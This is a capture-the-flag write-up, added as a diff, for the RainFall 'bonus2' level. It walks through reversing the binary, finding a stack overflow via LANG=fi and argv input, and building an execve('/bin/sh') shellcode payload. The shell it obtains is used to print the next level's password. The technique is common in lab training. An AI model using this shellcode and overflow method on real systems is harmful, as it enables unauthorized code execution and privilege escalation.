@@ -1,0 +1,171 @@
+## disassembl main func:
+
+after destracting main func i notice that the program reserv 0xa0 bytes for structer such 
+
+```c
+typedef struct {
+    char username[40];
+    char message[32];
+    int padding;
+} UserData;
+```
+
+because the program start to copy from argv[1] and argv[2] :
+
+```c
+    strncpy(user_data.username, argv[1], 40);
+
+    strncpy(user_data.message, argv[2], 32);
+```
+
+after it read a env var using :
+
+```c
+char *env_val = getenv("LANG");
+```
+
+then it compare it with "fi" and "fn" values:
+
+equivalent to :
+
+```c
+if (env_val != NULL) {
+    if (memcmp(env_val, "fi", 2) == 0) {
+        global_var = 1;
+    } 
+    else if (memcmp(env_val, "nl", 2) == 0) {
+        global_var = 2;
+    }
+}
+```
+
+and then it call a local greetuser function:
+
+```asm
+    mov    %esp,%edx
+    lea    0x50(%esp),%ebx
+    mov    $0x13,%eax
+    mov    %edx,%edi
+    mov    %ebx,%esi
+    mov    %eax,%ecx
+    rep movsl %ds:(%esi),%es:(%edi)
+    call   0x8048484 <greetuser>
+```
+
+inside this greetuser() funciton
+
+it reserv a local_str with size of 72 bytes and
+compare that's the global_var with three values and strcopy a specific string for each value
+to that local_str, and append the main func reserve bytes as string to it
+
+equivalent to :
+
+```c
+    char local_str[72]; 
+
+    if (global_var == 1) {
+        strcpy(local_str, "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "); 
+    }
+    else if (global_var == 2) {
+        strcpy(local_str, "Goedemiddag! ");
+    }
+    else if (global_var == 0) {
+        strcpy(local_str, "Hello ");
+    }
+
+    strcat(local_str, (char*)&data);
+    puts(local_str);
+```
+
+so as we know we can override the return address of that function by making
+this local_str size more then 72 + 'if there is a padding' + ebp
+
+and to do that we need the maximum size preseted to local_str to control eip with
+out input:
+
+so we need to set LANG env var to "fi"
+
+```bash
+bonus2@RainFall:~$ env -i LANG=fi ./bonus2 username message
+Hyvää päivää username
+```
+
+to find the exact position of my input that is override the eip
+
+i use :
+
+```bash
+(gdb) set environment  LANG=fi
+(gdb) run $(python -c 'print "A" * 40') $(python -c 'print "aaaabbbbccccddddeeeeffffgggg"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "aaaabbbbccccddddeeeeffffgggg"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabbbbccccddddeeeeffffgggg
+
+Program received signal SIGSEGV, Segmentation fault.
+0x66666565 in ?? ()
+```
+
+0x66666565 this is mean 'eeff' bytes
+
+now i need to define my start input address to pass it as next instruction for my shell_code
+
+i dispaly stack bytes to determine where is exactly "AAA..." start
+
+```bash
+bonus2@RainFall:~$ env -i LANG=fi gdb bonus2 
+
+b *0x08048528
+Breakpoint 1 at 0x8048528
+(gdb) run $(python -c 'print "A" * 40') $(python -c 'print "aaaabbbbccccddddeeeeffffgggg"')
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') $(python -c 'print "aaaabbbbccccddddeeeeffffgggg"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabbbbccccddddeeeeffffgggg
+
+Breakpoint 1, 0x08048528 in greetuser ()
+(gdb) x/20wx $esp
+0xbffffd1c:	0x66666565	0x67676666	0x41006767	0x41414141
+0xbffffd2c:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffd3c:	0x41414141	0x41414141	0x41414141	0x61616161
+0xbffffd4c:	0x62626262	0x63636363	0x64646464	0x65656565
+0xbffffd5c:	0x66666666	0x67676767	0x00000000	0x00000000
+```
+
+so the start of "AAA.." is 0xbffffd1c + 12 = 0xbffffd28
+
+i use the previous shellcode of level02 and level09 wich is
+
+```c
+    execve("/bin/sh");
+    exit(0);
+```
+
+opcode :
+
+```bash
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+
+so the payload will be :
+
+```bash
+./bonus2 $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAA"') $(python -c 'print "aaaabbbbccccddddee\x28\xfd\xff\xbfffgggg"')
+```
+
+but this not work , becuase the gdb add some env vars that make the stack address increse so i repet the same paylaod
+
+by decrise the address of buffer,
+
+and this work fine:
+
+```bash
+bonus2@RainFall:~$ env -i LANG=fi ./bonus2 $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80AAAAAAAAAAAAAAA"') $(python -c 'print "aaaabbbbccccddddee\x22\xfd\xff\xbfffgggg"')
+Hyvää päivää 1?Ph//shh/bin??P??S??
+                                  ̀AAAAAAAAAAAAAAAaaaabbbbccccddddee"???ffgggg
+$ ls
+ls: cannot open directory .: Permission denied
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
